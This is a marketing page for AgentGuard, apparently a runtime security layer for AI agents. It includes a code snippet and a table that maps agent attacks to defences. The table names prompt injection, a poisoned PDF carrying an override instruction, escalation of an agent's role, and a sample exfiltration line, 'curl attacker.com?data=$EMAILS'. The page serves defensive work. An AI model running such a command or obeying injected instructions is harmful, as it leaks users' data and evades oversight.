Why AgentGuard

Your AI agents are already running.

  • Reading documents.
  • Writing files.
  • Calling tools.
  • Querying databases.

One injected instruction in a PDF they read,
one rogue tool call,
one slow privilege escalation across a session —
and you're the next CVE.

Existing guardrails check what the model says.
Nothing checks what the agent does.

Introducing

A guardian agent that sits between your AI agents and the real world.

Every input. Every tool call. Every response. Validated before it executes — without rewriting a line of your agent code.

Platform

Three layers of defense. One decorator to enable them.

01

Block bad inputs

Stop prompt injection and jailbreaks before they reach your agent.

33 offline patterns catch the obvious attacks in under a millisecond. Enterprise-grade detection catches the rest. Free for the easy cases, cloud-backed for the hard ones.

02

Police every tool call

Watch what your agent is about to do — and stop it if it shouldn't.

Per-tool rules know the difference between a SELECT and a DROP, an allowed domain and an exfiltration attempt, a temp file and a credential. Risky calls escalate to a human or an AI reviewer.

03

Catch the slow attacks

Detect drift, escalation, and multi-step attack chains across an entire session.

Online machine learning learns each agent's normal behavior from the first call. It flags the patterns that span dozens of tool invocations — the kind a single rule check will never see.

Developer experience

One decorator. Full pipeline. No rearchitecting.

from agentguard import guard_agent

@guard_agent(config="agentguard.yaml")
def my_agent(message: str) -> str:
    return llm.complete(message)

That's it. The full 4-layer pipeline now wraps every call — input, tool use, output, audit log.

Coverage

Built for the OWASP Agentic Top 10.

Every category in the 2025 OWASP Agentic AI Top 10, mapped to a real attack and the AgentGuard layer that stops it.

OWASP Risk Real-world example How AgentGuard handles it
AT-01 Prompt Injection EchoLeak (CVE-2025-32711, CVSS 9.3) — zero-click data exfiltration via M365 Copilot Blocked at input by the offline pattern filter and Azure Prompt Shields before it reaches the model.
AT-02 Excessive Agency Agent writes or deletes files outside its scope The tool firewall denies any call that violates the policy. Role-based rules block out-of-scope actions.
AT-03 Memory Poisoning Adversarial PDF embeds an override instruction the agent later reads Indirect injection patterns are caught at the input layer, and tool outputs are scanned before re-entering the loop.
AT-04 Insecure Tool Use SQL injection or DROP TABLE via a crafted query SQL queries are parsed; DROP, DELETE, UPDATE, and unauthorized schemas are denied at the firewall.
AT-05 Resource Exhaustion Runaway tool-call loops draining API quota or compute The behavioral engine flags abnormal call rates and patterns, then escalates to a human reviewer.
AT-06 Data Exfiltration curl attacker.com?data=$EMAILS hidden in agent output HTTP calls hit a domain allowlist before they fire. Read-then-exfil chains are detected by the session graph.
AT-07 Privilege Escalation Agent assumes an admin role mid-session Roles are locked at the policy layer. The drift monitor catches gradual sensitivity escalation across calls.
AT-08 Supply Chain Attack Malicious tool injected at runtime by a compromised dependency Only registered tools can be invoked. Anything outside the allowed registry is denied immediately.
AT-09 Hallucination Exploit Fabricated tool result triggers a real-world action Output is checked for groundedness, PII, and toxicity before it ever reaches the user.
AT-10 Unsafe Coordination Agent A commands Agent B to do something neither is allowed to do alone Inter-agent permissions are evaluated against the same policy that governs single-agent actions.
